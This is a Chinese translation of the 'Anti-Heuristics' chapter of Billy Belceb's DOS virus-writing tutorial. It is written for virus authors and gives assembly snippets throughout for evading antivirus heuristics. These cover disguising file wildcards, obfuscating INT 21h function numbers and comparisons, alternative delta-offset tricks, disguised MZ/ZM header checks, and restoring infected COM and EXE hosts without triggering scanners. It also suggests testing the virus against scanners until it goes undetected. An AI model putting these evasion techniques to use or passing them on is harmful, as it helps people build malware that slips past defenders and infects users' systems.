
# Billy Belceb 病毒编写教程---DOS 篇

> 原文：[`www.pediy.com/kssd/pediy06/pediy640614.htm`](https://www.pediy.com/kssd/pediy06/pediy640614.htm)

## 反探索 (Anti-Heuristics)

~~~~~~~

探索方法在我们的代码里面寻找可疑的东西，只要避免使用如 `\*.com` 等等... 好了，我将更好地解释它。遵循这一点

不要使用诸如 `\*.com` 或者 `\*.exe` 之类的通配符：

这种类型的东西只会在运行期 `<g>` 病毒里使用，但是如果你确实需要它... 你可疑用 `\*.rom` 代替 `\*.com`，然后用下面的代码：

```assembly
mov byte ptr [bp+comfile+2],"c"
```

记住：在写病毒主体之前，存储 `\*.rom` 里的 r...

```assembly
mov byte ptr [bp+comfile+2],"r"
```

否则，你的努力就白费了。

在这个例子里，我们假设 `BP` 为变化的偏移地址，`com` 文件，`db "\*.rom",0`，而且这个病毒是一个直接感染病毒 `<g>`

不要使用明显的例程：

我们要讨论的是经典的 `INT 21h AH=40h`, `INT 21h AX=4301h`... 你可以做很多事情... 让我们在 `AX=4301h` 时玩玩。

我已经在哪里读过这个了，现在记不清在哪里了(可能是 `Wizard` 的用西班牙语写的教程:-?)

```assembly
push 4301h
pop ax
```

但是，有一个问题... 编译然后把它反编译。让我们看看由 `TASM` 产生的东西:) 毫无疑问，这个只会在这个代码中所选的处理器比 386 还差。

```assembly
push ax bp
mov bp,sp
mov word ptr [bp+02],4301h
pop bp ax
```

这是 `push 4301h` 和 `pop ax` 的反汇编代码。它占 11 字节！！！我认为它是对代码的浪费。更好的使用情况为：

```assembly
mov ax,4300h
inc ax
```

或者更好：

```assembly
mov ax,0043h
inc ah
xchg ah,al
```

还有：

```assembly
mov bx,4300h
xor ax,ax
xchg ax,bx
```

对你的多态引擎的所有例程过度的怀疑：

对许多的垃圾的使用要小心，如一个字节的指令(`cli`, `sti`, `lahf`, `nop`, `std`, `cld`, `cmc`...)。病毒查杀工具能显示一个标志。探索引擎将会试图去解密代码。我建议你设置一个反调试例程来阻止它。看看这篇文档的 `ARMOURING` 这一章。

在你的驻留内存检查时不要使用奇怪的调用：

如果你在你的驻留内存检测时使用如 `AX=DEADh`，一个标志将会被触发。要使用低于 `6E00h` 的检查。低于 `6E00h` 的功能有很多还没使用。你要想看更多的信息，可以看看 `Ralph Brown` 的中断列表。

不要使用不常见的中断：

如果你使用高于 80 的中断，一个标志将会被触发。

尽可能的优化你的代码：

你可以参考关于这个话题的教程(如 `darkman` 在 `VLAD#2` 中的文章或者 `29A#3` 中的文章)。

获得偏移地址的时候要尽可能的新颖：

在过得改变的偏移地址的时候不要使用：

```assembly
call delta
delta:
pop si
sub si,offset delta
```

这个被很多的病毒使用，毫无疑问一个标志将会被触发。(在这个例子里，`delta offset` 将会存字 `SI` 里)

有很多代替的方法来获得 `delta offset`:

```assembly
mov bx,old_size_of_infected_file
jmp bx
```

(当然你可以使用另外的寄存器而不是 `BX`)

另外一个：

```assembly
call delta
delta:
mov si,sp
mov bp,word ptr ss:[si]
sub bp,offset delta
```

(在上面的代码里，`BP` 将会为 `Delta offset`)

另外一个：

```assembly
mov bp,sp
int 03h
delta:
mov bp,ss:[bp-6]
sub bp,offset delta
```

使你的加密例程非常优化。如果你使用某些方法，探索将会抓住病毒，所有我们的努力将会付之东流。

使你的 `TSR` 例程更加怪：

努力避免和 0 比较：

```assembly
cmp byte ptr [0],"Z"
```

在你的 `int 21` 处理程序里避免使用"真正"的比较，只要试试如下的(`4bh` 的例子)：

```assembly
xchg ah,al
cmp al,4Bh
[...]
xchg ah,al
```

或者对这个值 `xor`。

```assembly
xor ax,0FFFFh
cmp ah,(4Bh xor 0FFh)
xor ax,0FFFFh
```

或者同时;)

```assembly
xor ax,0FFFFh
xchg ah,al
cmp al,(4Bh xor 0FFh)
xchg ah,al
xor ax,0FFFFh
```

记住这一点：在调用真正的 `int 21` 之后在使用这些例程之前返回和以前一样的值。

探索法在搜索的时候比较 `MZ` 或者 `ZM` 如：

```assembly
cmp ax,"ZM"
cmp ax,"MZ"
```

你可以这么试试：

```assembly
mov al,byte ptr [header]
add al,byte ptr [header+1]
cmp al,"M"+"Z"
```

这是一个非常有用的例程：你可以同时检查 `MZ` 和 `ZM`。假设就是这样... 文件头至少包含文件头的前两个字节。或者你还可以以小写的形式，用一个简单的 `or ax,2020h`(`AX` 是包含这个字符串的寄存器)，比较时如下：

```assembly
cmp ax,"zm"
cmp ax,"mz"
```

尽可能的使你的病毒更加独特:)

用很多的病毒查杀工具把你的代码扫描很多遍来看看它能否被发现。

对恢复 `COM` 和 `EXE` 主体恢复的例程要轻微的改动。让我们现在来看看怎样编制对 `COM` 文件的反探索恢复程序：

```assembly
mov  di,101h     ; This shit will fool AV
dec  di
push  di     ; DI=100h :)
lea  si,[bp+offset OldBytes] ; Restore 3 bytes
movsw       ; ( Change it for your needs )
movsb
ret       ; Jump to 100h ;)
oldbytes  db CDh,20h,00
```

下面来看恢复 `EXE` 文件时怎么对付探索：

```assembly
mov  bx,bp     ; Use BX as delta offset :)
mov  ax,ds
add  ax,0010h
add  word ptr cs:[bx+@@CS],ax
add  ax,cs:[bx+@@SP]
cli
mov  ss,ax
mov  sp,cs:[bx+@@SS]
sti
db  0EAh      ; JUMP FAR
cs_ip    equ  dword
@@IP    dw  0000h    ; In 1st gen, put here the offset to
           ; a MOV AX,4C00h/INT 21h
@@CS    dw  0000h
ss_sp    equ  dword
@@SS    dw  0000h
@@SP    dw  0000h
```

%最后的讨论%

~~~~~~~~~~

有些探索(如 `TBSCAN`)的一个巨大的失败之处是它们不搜索寄存器的值。我们就可以利用这一点了。只要想一想编写一个 `mov ax,4301h` 或者一个 `cmp ah,4Bh` 的所有可能性... 一切尽在掌握...

`4dd466d0e1e0cc123afbe504da2462ca`
